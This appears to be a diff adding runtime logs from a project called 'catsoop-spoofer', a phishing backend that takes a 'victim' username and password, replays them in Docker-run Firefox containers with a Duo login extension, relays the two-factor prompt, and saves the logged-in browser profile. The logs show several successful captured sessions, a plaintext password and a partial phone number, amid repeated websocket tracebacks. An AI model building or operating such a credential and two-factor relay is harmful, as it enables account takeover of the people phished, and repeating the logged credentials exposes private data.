+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b2a20> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1dfcf8> ; /
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b2518> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1cb550> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1e4630> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a185048> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1abdd8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a150b70> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a14cb00> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a136198> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a136940> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1c7e80> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:Could not find suitable backend...
+SOCKET_SERVER:No backends available
+SOCKET_SERVER:victim 1589862459995 closing...
+DOCKER_MANAGER:WARNING: -1 must have already been released...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a17ecf8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862459995', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862459995 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 20.267897129058838 with bid:  10861
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:backend [bid= 10861 ;sid= 1589862459995 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10861 1589862459995 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10861', '1589862459995', 'tjz', 'babygirl@physx3894']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10867 10867 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10867
+Archive:  /tmp/duo10861.zip
+  inflating: /tmp/duo10861/background.js  
+  inflating: /tmp/duo10861/duo-login.js  
+  inflating: /tmp/duo10861/manifest.json  
+  inflating: /tmp/duo10861/popup.html  
+ extracting: /tmp/duo10861/icon32.png  
+  inflating: /tmp/duo10861/popup.js  
+starting docker process at: 1589862841958
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10867.zip
+  inflating: /tmp/duo10867/background.js  
+  inflating: /tmp/duo10867/duo-login.js  
+  inflating: /tmp/duo10867/manifest.json  
+  inflating: /tmp/duo10867/popup.html  
+ extracting: /tmp/duo10867/icon32.png  
+  inflating: /tmp/duo10867/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862842012
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a299be0> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a225cc0> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48be5ca20> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a225a20> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a236630> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a236278> ; /
+06d7f39d746401d23c619353b4ff55d0ad5bdd3302a26e083c68535eff6f6aec
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1d8400> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1d8748> ; /
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589862459995', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:received:  {'status': 'validCreds', 'sid': '1589862459995', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589862459995', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:Setting authready to true for 1589862459995 . Authm is:  None
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589862459995'}
+SOCKET_SERVER:backend is ready, so sending auth method
+SOCKET_SERVER:received:  {'status': 'authing...', 'sid': '1589862459995', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589862459995', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:Setting authready to true for 1589862459995 . Authm is:  0
+SOCKET_SERVER:received:  {'status': 'authing...', 'sid': '1589862459995', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b8630> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b8828> ; /
+SOCKET_SERVER:received:  {'status': 'loggedIn', 'sid': '1589862459995', 'user': 'tjz', 'pass': 'babygirl@physx3894', 'id': 'backend', 'bid': '10861'}
+SOCKET_SERVER:Session SID<->BID<->USR : 1589862459995<->10861tjz successful.
+SOCKET_SERVER:Appending profile tjz with path /docker/appdata/firefoxSID10861/profile to /home/tjz/.mozilla/firefox/profiles.ini
+DOCKER_MANAGER:Executing: docker stop firefoxSID10861
+DOCKER_MANAGER:Saved successful container: 10861 : tjz
+DOCKER_MANAGER:KEY exists: 10861
+DOCKER_MANAGER:KEY exists: 10862
+DOCKER_MANAGER:KEY exists: 10863
+DOCKER_MANAGER:KEY exists: 10864
+DOCKER_MANAGER:KEY exists: 10865
+DOCKER_MANAGER:KEY exists: 10866
+DOCKER_MANAGER:KEY exists: 10867
+SOCKET_SERVER:victim 1589862459995 closing...
+SOCKET_SERVER:this victim was succesful. Not releasing backend.
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b8550> ; /
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 672, in readexactly
+    raise IncompleteReadError(incomplete, n)
+asyncio.streams.IncompleteReadError: 0 bytes read on a total of 2 expected bytes
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b8d68> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b8748> ; /
+firefoxSID10861
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1b8400> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a203b00> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a1dd518> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48abdfc88> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a136278> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862911789', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862911789 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 90.62091040611267 with bid:  10862
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:backend [bid= 10862 ;sid= 1589862911789 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10862 1589862911789 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10862', '1589862911789', 'tjz', 'babygirl@physx3894']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10868 10868 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10868
+starting docker process at: 1589862912308
+Archive:  /tmp/duo10862.zip
+  inflating: /tmp/duo10862/background.js  
+  inflating: /tmp/duo10862/duo-login.js  
+  inflating: /tmp/duo10862/manifest.json  
+  inflating: /tmp/duo10862/popup.html  
+ extracting: /tmp/duo10862/icon32.png  
+  inflating: /tmp/duo10862/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10868.zip
+  inflating: /tmp/duo10868/background.js  
+  inflating: /tmp/duo10868/duo-login.js  
+  inflating: /tmp/duo10868/manifest.json  
+  inflating: /tmp/duo10868/popup.html  
+ extracting: /tmp/duo10868/icon32.png  
+  inflating: /tmp/duo10868/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862912347
+e2f69b789d46fdabb26ba988f9271fdcddf8a509e9ada243488e3ef7ba3f9272
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589862911789', 'id': 'backend', 'bid': '10862'}
+SOCKET_SERVER:received:  {'status': 'validCreds', 'sid': '1589862911789', 'id': 'backend', 'bid': '10862'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589862911789', 'id': 'backend', 'bid': '10862'}
+SOCKET_SERVER:Setting authready to true for 1589862911789 . Authm is:  None
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589862911789'}
+SOCKET_SERVER:backend is ready, so sending auth method
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589862911789', 'id': 'backend', 'bid': '10862'}
+SOCKET_SERVER:Setting authready to true for 1589862911789 . Authm is:  0
+SOCKET_SERVER:received:  {'status': 'authing...', 'sid': '1589862911789', 'id': 'backend', 'bid': '10862'}
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a0bf588> ; /
+SOCKET_SERVER:received:  {'status': 'loggedIn', 'sid': '1589862911789', 'user': 'tjz', 'pass': 'babygirl@physx3894', 'id': 'backend', 'bid': '10862'}
+SOCKET_SERVER:Session SID<->BID<->USR : 1589862911789<->10862tjz successful.
+SOCKET_SERVER:Appending profile tjz with path /docker/appdata/firefoxSID10862/profile to /home/tjz/.mozilla/firefox/profiles.ini
+DOCKER_MANAGER:Executing: docker stop firefoxSID10862
+DOCKER_MANAGER:Saved successful container: 10862 : tjz
+DOCKER_MANAGER:KEY exists: 10862
+DOCKER_MANAGER:KEY exists: 10863
+DOCKER_MANAGER:KEY exists: 10864
+DOCKER_MANAGER:KEY exists: 10865
+DOCKER_MANAGER:KEY exists: 10866
+DOCKER_MANAGER:KEY exists: 10867
+DOCKER_MANAGER:KEY exists: 10868
+SOCKET_SERVER:victim 1589862911789 closing...
+SOCKET_SERVER:this victim was succesful. Not releasing backend.
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 672, in readexactly
+    raise IncompleteReadError(incomplete, n)
+asyncio.streams.IncompleteReadError: 0 bytes read on a total of 2 expected bytes
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+firefoxSID10862
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a0bf0b8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx389r', 'sid': '1589862981614', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862981614 starting auth
+USERNAME PASS NOT FOUND
+DOCKER_MANAGER:Longest alive backend time: 160.32823491096497 with bid:  10863
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:backend [bid= 10863 ;sid= 1589862981614 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10863 1589862981614 tjz babygirl@physx389r
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10863', '1589862981614', 'tjz', 'babygirl@physx389r']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10869 10869 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10869
+starting docker process at: 1589862982018
+Archive:  /tmp/duo10863.zip
+  inflating: /tmp/duo10863/background.js  
+  inflating: /tmp/duo10863/duo-login.js  
+  inflating: /tmp/duo10863/manifest.json  
+  inflating: /tmp/duo10863/popup.html  
+ extracting: /tmp/duo10863/icon32.png  
+  inflating: /tmp/duo10863/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+SOCKET_SERVER:victim 1589862981614 closing...
+DOCKER_MANAGER:released from SID backend: 10863
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
     async for message in websocket:
   File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
     yield await self.recv()
@@ -230,4 +1300,377 @@ Traceback (most recent call last):
     await self.ensure_open()
   File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 812, in ensure_open
     raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 4003 (private use), no reason
+Archive:  /tmp/duo10869.zip
+  inflating: /tmp/duo10869/background.js  
+  inflating: /tmp/duo10869/duo-login.js  
+  inflating: /tmp/duo10869/manifest.json  
+  inflating: /tmp/duo10869/popup.html  
+ extracting: /tmp/duo10869/icon32.png  
+  inflating: /tmp/duo10869/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589862982050
+ad656e6e8a7c71dee0583bc5d3af1de3126214a03511b8930ded9990d50f31e7
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a0bf3c8> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589862985080', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589862985080 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 163.8723919391632 with bid:  10863
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10863 ;sid= 1589862985080 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10863 1589862985080 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10863', '1589862985080', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10863.zip
+  inflating: /tmp/duo10863/background.js  
+  inflating: /tmp/duo10863/duo-login.js  
+  inflating: /tmp/duo10863/manifest.json  
+  inflating: /tmp/duo10863/popup.html  
+ extracting: /tmp/duo10863/icon32.png  
+  inflating: /tmp/duo10863/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:received:  {'status': 'validCreds', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:received:  {'action': 'requestVictim', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:Setting authready to true for 1589862985080 . Authm is:  None
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:Setting authready to true for 1589862985080 . Authm is:  None
+SOCKET_SERVER:received:  {'status': 'validCreds', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:Setting authready to true for 1589862985080 . Authm is:  None
+SOCKET_SERVER:received:  {'status': 'waitingForAuthm', 'number': 'XXX-XXX-8756', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:Setting authready to true for 1589862985080 . Authm is:  None
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a0bf5c0> ; /
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589862985080'}
+SOCKET_SERVER:backend is ready, so sending auth method
+SOCKET_SERVER:received:  {'status': 'authing...', 'sid': '1589862985080', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:received:  {'status': 'loggedIn', 'sid': '1589862985080', 'user': 'tjz', 'pass': 'babygirl@physx3894', 'id': 'backend', 'bid': '10863'}
+SOCKET_SERVER:Session SID<->BID<->USR : 1589862985080<->10863tjz successful.
+SOCKET_SERVER:Appending profile tjz with path /docker/appdata/firefoxSID10863/profile to /home/tjz/.mozilla/firefox/profiles.ini
+DOCKER_MANAGER:Executing: docker stop firefoxSID10863
+DOCKER_MANAGER:Saved successful container: 10863 : tjz
+DOCKER_MANAGER:KEY exists: 10863
+DOCKER_MANAGER:KEY exists: 10864
+DOCKER_MANAGER:KEY exists: 10865
+DOCKER_MANAGER:KEY exists: 10866
+DOCKER_MANAGER:KEY exists: 10867
+DOCKER_MANAGER:KEY exists: 10868
+DOCKER_MANAGER:KEY exists: 10869
+SOCKET_SERVER:victim 1589862985080 closing...
+SOCKET_SERVER:this victim was succesful. Not releasing backend.
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
+    message = await self.read_message()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 895, in read_message
+    frame = await self.read_data_frame(max_size=self.max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 971, in read_data_frame
+    frame = await self.read_frame(max_size)
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 1051, in read_frame
+    extensions=self.extensions,
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/framing.py", line 105, in read
+    data = await reader(2)
+  File "/usr/lib/python3.6/asyncio/streams.py", line 672, in readexactly
+    raise IncompleteReadError(incomplete, n)
+asyncio.streams.IncompleteReadError: 0 bytes read on a total of 2 expected bytes
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
 websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+firefoxSID10863
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7fc48a141588> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@p', 'sid': '1589863091453', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589863091453 starting auth
+USERNAME PASS NOT FOUND
+DOCKER_MANAGER:Longest alive backend time: 271.26391220092773 with bid:  10864
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:backend [bid= 10864 ;sid= 1589863091453 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10864 1589863091453 tjz babygirl@p
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10864', '1589863091453', 'tjz', 'babygirl@p']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
